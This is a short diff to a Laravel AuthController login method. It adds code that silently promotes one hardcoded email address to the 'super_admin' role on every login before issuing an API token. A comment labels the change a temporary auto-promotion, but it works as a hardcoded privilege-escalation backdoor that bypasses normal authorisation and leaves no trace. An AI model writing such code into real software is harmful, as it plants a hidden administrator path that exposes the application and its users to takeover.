@@ -44,6 +44,13 @@ class AuthController extends Controller
         }
 
         $user = User::where('email', $request->email)->firstOrFail();
+
+        // 🚀 TEMPORARY AUTO-PROMOTION: Upgrades your user on login
+        if ($user->email === 'ahseven@trainer.com') {
+            $user->update(['role' => 'super_admin']);
+            $user->refresh(); // Refresh model to get the updated role in the response
+        }
+
         $token = $user->createToken('react-app')->plainTextToken;
 
         return response()->json([
